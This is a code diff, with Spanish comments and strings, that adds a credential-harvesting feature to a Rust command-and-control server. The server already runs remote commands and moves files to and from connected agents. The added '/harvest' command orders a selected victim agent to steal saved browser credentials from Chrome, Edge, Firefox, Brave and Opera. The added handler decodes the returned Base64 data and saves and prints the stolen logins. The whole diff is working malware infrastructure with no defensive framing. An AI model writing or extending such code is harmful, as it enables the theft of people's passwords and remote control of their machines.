@@ -235,6 +235,11 @@ async fn handle_client(
                             if response.starts_with("__FILE__:") {
                                 info!("[{}] Recibiendo archivo descargado", id);
                                 handle_file_download(&response, id, verbose);
+                            } else if response.starts_with("__CREDENTIALS_B64__:") {
+                                // Respuesta de /harvest con credenciales en Base64
+                                let encoded = response.strip_prefix("__CREDENTIALS_B64__:").unwrap_or("");
+                                info!("[{}] Recibiendo credenciales robadas (Base64)", id);
+                                handle_credentials_harvest(encoded, id);
                             } else if response.starts_with("__ERROR__:") {
                                 let error = response.strip_prefix("__ERROR__:").unwrap_or(&response);
                                 error!("[{}] Error recibido: {}", id, error);
@@ -353,6 +358,70 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
         Err(e) => {
             error!("[{}] Error decodificando base64: {}", client_id, e);
             eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
+        }
+    }
+}
+
+/// Maneja la recepción de credenciales robadas en Base64
+fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
+    // Decodificar Base64
+    match base64_decode(encoded_data) {
+        Ok(decoded_bytes) => {
+            // Convertir bytes a string UTF-8
+            match String::from_utf8(decoded_bytes) {
+                Ok(credentials_text) => {
+                    // Crear directorio harvested si no existe
+                    if let Err(e) = fs::create_dir_all("harvested") {
+                        error!("[{}] Error creando directorio harvested: {}", client_id, e);
+                        eprintln!("{} Error creando directorio harvested: {}", "❌".bright_red(), e);
+                        return;
+                    }
+                    
+                    // Nombre del archivo con timestamp
+                    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+                    let filename = format!("harvested/credentials_{}_{}.txt", client_id, timestamp);
+                    
+                    // Guardar archivo
+                    match fs::write(&filename, &credentials_text) {
+                        Ok(_) => {
+                            info!("[{}] Credenciales guardadas en: {}", client_id, filename);
+                            
+                            // Mostrar en consola con formato bonito
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
+                            println!("{}", format!("║         🔑 CREDENCIALES OBTENIDAS [{}]", client_id).bright_green().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
+                            println!();
+                            
+                            // Contar credenciales (líneas que contienen "Browser:")
+                            let cred_count = credentials_text.lines()
+                                .filter(|line| line.trim().starts_with("Browser:"))
+                                .count();
+                            
+                            println!("  {} {}", "📊 Total:".bright_cyan().bold(), format!("{} credenciales", cred_count).bright_white());
+                            println!("  {} {}", "💾 Guardado:".bright_cyan().bold(), filename.bright_white());
+                            println!("  {} {}", "📄 Tamaño:".bright_cyan().bold(), format!("{} bytes", credentials_text.len()).bright_white());
+                            println!();
+                            println!("{}", "─".repeat(60).bright_black());
+                            println!("{}", credentials_text.bright_white());
+                            println!("{}", "─".repeat(60).bright_black());
+                            println!();
+                        }
+                        Err(e) => {
+                            error!("[{}] Error guardando credenciales: {}", client_id, e);
+                            eprintln!("{} Error guardando credenciales: {}", "❌".bright_red(), e);
+                        }
+                    }
+                }
+                Err(e) => {
+                    error!("[{}] Error convirtiendo credenciales a UTF-8: {}", client_id, e);
+                    eprintln!("{} Datos decodificados no son UTF-8 válido: {}", "❌".bright_red(), e);
+                }
+            }
+        }
+        Err(e) => {
+            error!("[{}] Error decodificando Base64: {}", client_id, e);
+            eprintln!("{} Error decodificando Base64: {}", "❌".bright_red(), e);
         }
     }
 }
@@ -539,6 +608,7 @@ async fn main() {
                     println!("  {} {:<20} {}", "📡".bright_magenta(), "/cmd_all <cmd>", "Envía comando a TODOS los clientes".bright_white());
                     println!("  {} {:<20} {}", "📥".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
                     println!("  {} {:<20} {}", "📤".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
+                    println!("  {} {:<20} {}", "🔑".bright_red(), "/harvest", "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)".bright_white());
                     println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
                     println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
                     println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
@@ -735,6 +805,36 @@ async fn main() {
                                 error!("[{}] Error leyendo archivo local '{}': {}", id, local_path, e);
                                 println!("{} Error leyendo archivo local '{}': {}", "❌".bright_red(), local_path, e);
                             }
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/harvest" => {
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /harvest: Robando credenciales de browsers", id);
+                            if let Err(e) = client.tx.send("__STEAL__".to_string()) {
+                                error!("[{}] Error enviando comando harvest: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            } else {
+                                println!();
+                                println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
+                                println!("{}", format!("║           🔑 HARVESTING CREDENTIALS [{}]", id).bright_red().bold());
+                                println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
+                                println!();
+                                println!("{}", "  🕵️  Robando credenciales de browsers...".bright_yellow());
+                                println!("{}", "  🎯 Chrome, Edge, Firefox, Brave, Opera".bright_white().dimmed());
+                                println!("{}", "  ⏳ Esperando respuesta del agente...".bright_white().dimmed());
+                                println!();
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
                         }
                     } else {
                         println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
